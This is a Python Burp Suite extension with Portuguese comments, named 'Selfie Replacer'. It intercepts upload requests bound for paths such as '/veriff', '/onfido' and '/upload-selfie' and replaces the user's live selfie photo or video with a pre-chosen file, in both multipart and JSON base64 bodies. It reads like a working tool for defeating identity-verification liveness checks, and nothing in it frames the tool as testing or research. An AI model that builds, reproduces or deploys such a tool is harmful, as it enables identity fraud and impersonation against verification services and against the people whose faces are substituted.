# BurpSuite Extension: Auto-replace selfie video/image
# 
# INSTALAÇÃO:
# 1. No BurpSuite: Extensions → Add → Extension type: Python
# 2. Selecione este arquivo: burp-selfie-replacer.py
# 3. Configure as variáveis abaixo (linhas 15-20)
# 4. Ative Proxy → Intercept is on
#
# FUNCIONAMENTO:
# Quando uma requisição de upload passar pelo Burp, este script automaticamente
# substitui o vídeo/imagem pelo arquivo que você configurou.

from burp import IBurpExtender, IHttpListener
import os
import base64
import json

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Selfie Replacer")
        callbacks.registerHttpListener(self)
        
        # ========================================
        # Lê o caminho do arquivo de substituição do app (burp-replacement-path.txt)
        # Se o app tiver escolhido uma imagem, ela é salva em burp-replacement.jpg/png e o path aqui.
        # ========================================
        self.script_dir = os.path.dirname(os.path.abspath(__file__))
        path_file = os.path.join(self.script_dir, "burp-replacement-path.txt")
        if os.path.exists(path_file):
            try:
                with open(path_file, "r") as f:
                    self.replacement_file = f.read().strip()
            except Exception:
                self.replacement_file = os.path.join(self.script_dir, "burp-replacement.jpg")
        else:
            self.replacement_file = os.path.join(self.script_dir, "burp-replacement.jpg")
        
        # MIME a partir da extensão do arquivo
        ext = os.path.splitext(self.replacement_file)[1].lower()
        mime_map = {
            ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".png": "image/png",
            ".mp4": "video/mp4", ".webm": "video/webm", ".mov": "video/quicktime",
        }
        self.replacement_mime = mime_map.get(ext, "image/jpeg")
        
        # URLs que devem ter o vídeo substituído (adicione mais se necessário)
        self.target_urls = [
            "/api/upload-selfie",
            "/veriff",
            "/onfido",
            "/upload",
            "/selfie",
            "/video",
            "/photo"
        ]
        
        # ========================================
        
        if os.path.exists(self.replacement_file):
            file_size = os.path.getsize(self.replacement_file)
            print("=" * 60)
            print("Selfie Replacer carregado! (usa burp-replacement-path.txt do app)")
            print("Arquivo de substituição:", self.replacement_file)
            print("Tamanho:", file_size, "bytes")
            print("MIME type:", self.replacement_mime)
            print("URLs monitoradas:", ", ".join(self.target_urls))
            print("=" * 60)
        else:
            print("AVISO: Arquivo ainda não existe:", self.replacement_file)
            print("Escolha uma imagem no app (Toolbox -> Imagem para o Burp) e recarregue a extensão.")
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return
        
        request = messageInfo.getRequest()
        analyzed = self._helpers.analyzeRequest(request)
        url = str(analyzed.getUrl())
        
        # Verifica se a URL está na lista de alvos
        should_replace = any(pattern in url.lower() for pattern in self.target_urls)
        if not should_replace:
            return
        
        # Re-lê o path do arquivo (app pode ter escolhido outra imagem)
        path_file = os.path.join(self.script_dir, "burp-replacement-path.txt")
        if os.path.exists(path_file):
            try:
                with open(path_file, "r") as f:
                    self.replacement_file = f.read().strip()
                ext = os.path.splitext(self.replacement_file)[1].lower()
                mime_map = {".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".png": "image/png",
                           ".mp4": "video/mp4", ".webm": "video/webm", ".mov": "video/quicktime"}
                self.replacement_mime = mime_map.get(ext, "image/jpeg")
            except Exception:
                pass
        
        body = request[analyzed.getBodyOffset():]
        body_str = self._helpers.bytesToString(body)
        
        # Verifica se é multipart/form-data
        if "multipart/form-data" in body_str.lower():
            if self._replaceMultipart(messageInfo, analyzed, body_str):
                print("[Selfie Replacer] Vídeo substituído (multipart) em:", url)
        # Verifica se é JSON com base64
        elif "application/json" in body_str.lower() or '"video"' in body_str or '"image"' in body_str or '"file"' in body_str:
            if self._replaceJsonBase64(messageInfo, analyzed, body_str):
                print("[Selfie Replacer] Vídeo substituído (JSON) em:", url)
    
    def _replaceMultipart(self, messageInfo, analyzed, body_str):
        try:
            if not os.path.exists(self.replacement_file):
                return False
            
            # Lê o arquivo de substituição
            with open(self.replacement_file, 'rb') as f:
                replacement_data = f.read()
            
            # Encontra o boundary
            boundary = None
            headers = analyzed.getHeaders()
            for header in headers:
                if 'content-type' in header.lower() and 'boundary=' in header.lower():
                    parts = header.split('boundary=')
                    if len(parts) > 1:
                        boundary = parts[1].strip()
                        break
            
            if not boundary:
                # Tenta encontrar no body
                for line in body_str.split('\r\n'):
                    if 'boundary=' in line.lower():
                        boundary = line.split('boundary=')[1].strip().strip('"').strip("'")
                        break
            
            if not boundary:
                print("[Selfie Replacer] Boundary não encontrado")
                return False
            
            # Encontra a parte do vídeo/imagem
            parts = body_str.split('--' + boundary)
            new_parts = []
            replaced = False
            
            for part in parts:
                if not part.strip():
                    new_parts.append(part)
                    continue
                
                # Verifica se esta parte contém vídeo/imagem
                if ('filename=' in part.lower() and 
                    ('video' in part.lower() or 'image' in part.lower() or 'file' in part.lower())):
                    # Encontra onde começa o conteúdo binário
                    header_end = part.find('\r\n\r\n')
                    if header_end > 0:
                        header = part[:header_end + 4]
                        # Reconstrói a parte com o novo conteúdo
                        new_part = header + self._helpers.bytesToString(replacement_data)
                        new_parts.append(new_part)
                        replaced = True
                    else:
                        new_parts.append(part)
                else:
                    new_parts.append(part)
            
            if replaced:
                new_body = ('--' + boundary).join(new_parts)
                
                # Atualiza Content-Length
                new_headers = []
                content_length_set = False
                for header in headers:
                    if 'content-length' in header.lower():
                        new_length = len(self._helpers.stringToBytes(new_body))
                        new_headers.append('Content-Length: ' + str(new_length))
                        content_length_set = True
                    else:
                        new_headers.append(header)
                
                if not content_length_set:
                    new_length = len(self._helpers.stringToBytes(new_body))
                    new_headers.append('Content-Length: ' + str(new_length))
                
                # Reconstrói a requisição
                new_request = self._helpers.buildHttpMessage(new_headers, new_body)
                messageInfo.setRequest(new_request)
                return True
            
            return False
            
        except Exception as e:
            print("[Selfie Replacer] Erro ao substituir multipart:", str(e))
            import traceback
            traceback.print_exc()
            return False
    
    def _replaceJsonBase64(self, messageInfo, analyzed, body_str):
        try:
            if not os.path.exists(self.replacement_file):
                return False
            
            # Tenta fazer parse do JSON
            try:
                data = json.loads(body_str)
            except:
                # Se não for JSON válido, tenta encontrar base64 manualmente
                return False
            
            # Lê o arquivo e converte para base64
            with open(self.replacement_file, 'rb') as f:
                replacement_data = f.read()
            base64_data = base64.b64encode(replacement_data).decode('utf-8')
            
            # Substitui campos de vídeo/imagem
            replaced = False
            for key in ['video', 'image', 'file', 'selfie', 'photo', 'media', 'blob']:
                if key in data:
                    if isinstance(data[key], str):
                        if data[key].startswith('data:'):
                            # Mantém o prefixo data:type;base64,
                            prefix = data[key].split(',')[0] + ','
                            data[key] = prefix + base64_data
                        else:
                            # Assume que é base64 puro ou adiciona prefixo
                            if 'base64' in data[key].lower() or len(data[key]) > 100:
                                data[key] = base64_data
                            else:
                                data[key] = 'data:' + self.replacement_mime + ';base64,' + base64_data
                        replaced = True
            
            if replaced:
                new_body = json.dumps(data)
                headers = analyzed.getHeaders()
                
                # Atualiza Content-Length
                new_headers = []
                content_length_set = False
                for header in headers:
                    if 'content-length' in header.lower():
                        new_length = len(self._helpers.stringToBytes(new_body))
                        new_headers.append('Content-Length: ' + str(new_length))
                        content_length_set = True
                    else:
                        new_headers.append(header)
                
                if not content_length_set:
                    new_length = len(self._helpers.stringToBytes(new_body))
                    new_headers.append('Content-Length: ' + str(new_length))
                
                new_request = self._helpers.buildHttpMessage(new_headers, new_body)
                messageInfo.setRequest(new_request)
                return True
            
            return False
        
        except Exception as e:
            print("[Selfie Replacer] Erro ao substituir JSON:", str(e))
            import traceback
            traceback.print_exc()
            return False
